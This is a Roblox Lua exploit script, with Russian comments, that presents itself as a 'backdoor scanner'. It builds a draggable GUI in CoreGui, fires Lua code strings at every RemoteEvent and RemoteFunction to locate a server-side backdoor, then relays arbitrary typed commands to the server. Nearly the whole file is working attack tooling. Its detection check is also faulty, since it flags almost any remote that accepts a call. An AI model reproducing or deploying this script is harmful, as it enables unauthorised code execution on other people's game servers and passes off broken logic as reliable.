-- Promto Backdoor Scanner by Colin
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- Создаем основной интерфейс
local PromtoBackdoor = Instance.new("ScreenGui")
PromtoBackdoor.Name = "PromtoBackdoor"
PromtoBackdoor.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
PromtoBackdoor.ResetOnSpawn = false

-- Главный фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 500, 0, 400)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
MainFrame.BorderSizePixel = 0

-- Заголовок с градиентом
local TitleFrame = Instance.new("Frame")
TitleFrame.Size = UDim2.new(1, 0, 0, 50)
TitleFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Text = "PROMTO BACKDOOR"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 20
TitleLabel.BackgroundTransparency = 1

-- Кнопка сканирования
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0, 200, 0, 40)
ScanButton.Position = UDim2.new(0.5, -100, 0.3, 0)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ScanButton.Text = "НАЧАТЬ СКАНИРОВАНИЕ"
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamSemibold

-- Поле для команд
local CommandBox = Instance.new("TextBox")
CommandBox.Size = UDim2.new(0, 400, 0, 100)
CommandBox.Position = UDim2.new(0.05, 0, 0.5, 0)
CommandBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
CommandBox.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBox.PlaceholderText = "Введите команду здесь..."
CommandBox.TextWrapped = true
CommandBox.Visible = false

-- Кнопка выполнения
local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0, 120, 0, 35)
ExecuteButton.Position = UDim2.new(0.05, 0, 0.8, 0)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
ExecuteButton.Text = "ВЫПОЛНИТЬ"
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton.Visible = false

-- Статус
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.Position = UDim2.new(0, 0, 0.9, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Готов к сканированию"
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

-- Собираем интерфейс
TitleLabel.Parent = TitleFrame
TitleFrame.Parent = MainFrame
ScanButton.Parent = MainFrame
CommandBox.Parent = MainFrame
ExecuteButton.Parent = MainFrame
StatusLabel.Parent = MainFrame
MainFrame.Parent = PromtoBackdoor
PromtoBackdoor.Parent = game:GetService("CoreGui")

-- Функция для поиска бэкдора
local function findBackdoor()
    StatusLabel.Text = "Сканирование..."
    local foundBackdoor = nil
    
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local testName = "PromtoTest_" .. math.random(10000, 99999)
            
            pcall(function()
                if obj:IsA("RemoteEvent") then
                    obj:FireServer("print('" .. testName .. "')")
                else
                    obj:InvokeServer("print('" .. testName .. "')")
                end
            end)
            
            wait(0.1)
            
            -- Проверяем выполнилась ли команда
            pcall(function()
                if obj:IsA("RemoteEvent") then
                    obj:FireServer(game:GetService("HttpService"):JSONEncode({cmd = "test"}))
                else
                    obj:InvokeServer(game:GetService("HttpService"):JSONEncode({cmd = "test"}))
                end
                foundBackdoor = obj
            end)
            
            if foundBackdoor then break end
        end
    end
    
    return foundBackdoor
end

-- Обработчики событий
ScanButton.MouseButton1Click:Connect(function()
    ScanButton.Text = "СКАНИРУЕТСЯ..."
    
    local backdoor = findBackdoor()
    
    if backdoor then
        StatusLabel.Text = "Бэкдор найден: " .. backdoor:GetFullName()
        CommandBox.Visible = true
        ExecuteButton.Visible = true
        ScanButton.Visible = false
        
        -- Сохраняем бэкдор для использования
        _G.PromtoBackdoor = backdoor
    else
        StatusLabel.Text = "Бэкдор не найден"
        ScanButton.Text = "ПОВТОРИТЬ СКАНИРОВАНИЕ"
    end
end)

ExecuteButton.MouseButton1Click:Connect(function()
    if _G.PromtoBackdoor and CommandBox.Text ~= "" then
        pcall(function()
            if _G.PromtoBackdoor:IsA("RemoteEvent") then
                _G.PromtoBackdoor:FireServer(CommandBox.Text)
            else
                _G.PromtoBackdoor:InvokeServer(CommandBox.Text)
            end
            StatusLabel.Text = "Команда выполнена"
        end)
    end
end)

-- Функция для перетаскивания окна
local dragging = false
local dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

MainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Сообщение при запуске
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Promto Backdoor",
    Text = "Сканер успешно загружен!",
    Duration = 5
})
